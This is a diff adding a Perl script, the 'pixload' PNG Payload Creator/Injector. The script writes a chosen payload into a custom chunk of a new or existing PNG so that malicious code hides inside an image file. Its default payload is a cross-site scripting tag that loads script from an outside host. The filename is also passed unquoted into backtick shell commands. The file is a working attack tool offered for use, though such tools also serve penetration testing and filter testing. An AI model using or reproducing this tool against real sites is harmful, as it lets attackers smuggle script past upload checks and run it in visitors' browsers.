@@ -1,0 +1,192 @@
+#!/usr/bin/env perl
+#
+# PNG Payload Creator/Injector
+#
+# coded by sighook <alexandr.savca89@gmail.com>
+# credits to Brian de Heus <https://github.com/briandeheus>
+#
+# See LICENSE file for copyright and license details.
+#
+
+use strict;
+use warnings;
+no  warnings 'redefine';
+
+use feature  'say';
+
+use POSIX;
+use Getopt::Long qw(:config no_ignore_case);
+use File::Basename;
+
+use constant PROGRAM => basename $0;
+use constant VERSION => '@VERSION@';
+
+use GD;
+use String::CRC32;
+
+# # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # #
+#                             Default Options                                 #
+# # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # #
+
+my %opts = (
+    pixelwidth      =>  32,
+    pixelheight     =>  32,
+    payload         =>  '<script src=//example.com></script>',
+);
+
+# # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # #
+#                                Subroutines                                  #
+# # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # #
+
+sub systell {
+    sysseek $_[0], 0, SEEK_CUR
+}
+
+sub rewind {
+    sysseek $_[0], systell($_[0]) - $_[1], SEEK_CUR
+}
+
+sub create_png {
+    say "[>] Generating output file";
+
+    my $img = GD::Image->new(
+        $opts{pixelwidth},
+        $opts{pixelheight},
+        # set 1 to TrueColor (24 bits of color data), default is 8-bit palette
+        1,
+    );
+
+    my $color = $img->colorAllocate(0, 0, 0);
+
+    $img->setPixel(0, 0, $color);
+
+    sysopen my $fh, $opts{FILE}, O_CREAT|O_WRONLY;
+    syswrite   $fh, $img->png;
+    close      $fh;
+
+    say "[✔] File saved to: $opts{FILE}\n";
+}
+
+sub inject_payload {
+    say "[>] Injecting payload into $opts{FILE}\n";
+
+    sysopen our $fh, $opts{FILE}, O_RDWR;
+
+    # check if outfile is PNG to prevent infinite loop
+    {
+        my $format;
+        sysseek     $fh, 1, SEEK_SET;
+        sysread     $fh, $format, 3;
+
+        die "ERROR: $opts{FILE} is not a PNG file.\n"
+            if $format ne "PNG";
+    }
+
+    sysseek     $fh, 8, SEEK_SET;
+
+    sub read_chunks {
+        *read_next_chunk = \&read_chunks;
+
+        my ($chunk_size, $chunk_type, $content, $crc);
+
+        sysread $fh, $chunk_size, 4;
+        sysread $fh, $chunk_type, 4;
+
+        $chunk_size = unpack('I>', $chunk_size);
+
+        say "[+] Chunk size: $chunk_size";
+        say "[+] Chunk type: $chunk_type";
+
+        return if $chunk_type eq 'IEND';
+
+        sysread $fh, $content, $chunk_size;
+        sysread $fh, $crc, 4;
+
+        say '[+] CRC: ' . unpack('H8', $crc);
+
+        &read_next_chunk;
+    }
+    &read_chunks;
+
+    rewind   $fh, 8;
+
+    say "\n[>] Inject payload to the new chunk: 'pUnk'";
+
+    # chunk size
+    syswrite $fh, (pack 'I>', length $opts{payload});
+
+    # chunk name: PUnK (critical)
+    syswrite $fh, "\x50\x55\x6e\x4b";
+
+    syswrite $fh, $opts{payload};
+
+    syswrite $fh, (pack 'I>', crc32('IEND' . $opts{payload}));
+
+    syswrite $fh, "\x00IEND";
+
+    close    $fh;
+
+    say "[✔] Payload was injected successfully\n";
+}
+
+sub banner {
+    <<EOF;
+...... PNG Payload Creator/Injector ......
+..........................................
+... https://github.com/sighook/pixload ...
+..........................................
+EOF
+}
+
+sub usage {
+    <<"EOF";
+Usage: @{[ PROGRAM ]} [OPTION]... FILE
+Hide Payload/Malicious Code in PNG Images.
+
+Mandatory arguments to long options are mandatory for short options too.
+  -W, --pixelwidth  INTEGER   set pixel width for the new image (default: 32)
+  -H, --pixelheight INTEGER   set pixel height for the new image (default: 32)
+  -P, --payload STRING        set payload for injection
+  -v, --version               print version and exit
+  -h, --help                  print help and exit
+
+If the output FILE already exists, then payload will be injected into this
+existing file. Else, the new one will be created with specified pixels wide.
+EOF
+}
+
+sub version {
+    PROGRAM . " " . VERSION . " ";
+}
+
+sub main {
+    # command line options
+    GetOptions(
+        'h|help!'         =>  \$opts{help},
+        'v|version!'      =>  \$opts{version},
+        'P|payload=s'     =>  \$opts{payload},
+        'W|pixelwidth=i'  =>  \$opts{pixelwidth},
+        'H|pixelheight=i' =>  \$opts{pixelheight},
+    ) or die "$!\n";
+
+    $opts{FILE} = shift @ARGV;
+
+    say &usage    and  exit(0)  if   $opts{help};
+    say &version  and  exit(0)  if   $opts{version};
+    say &usage    and  exit(1)  if ! $opts{FILE};
+
+    say &banner;
+
+    &create_png if ! -f $opts{FILE};
+    &inject_payload;
+
+    if    (-f '/usr/bin/file'   ) { say `file       $opts{FILE}` }
+
+    if    (-f '/usr/bin/hexdump') { say `hexdump -C $opts{FILE}` }
+    elsif (-f '/usr/bin/xxd'    ) { say `xxd        $opts{FILE}` }
+}
+
+main;
+
+# vim:sw=4:ts=4:sts=4:et:cc=80
+# End of file.
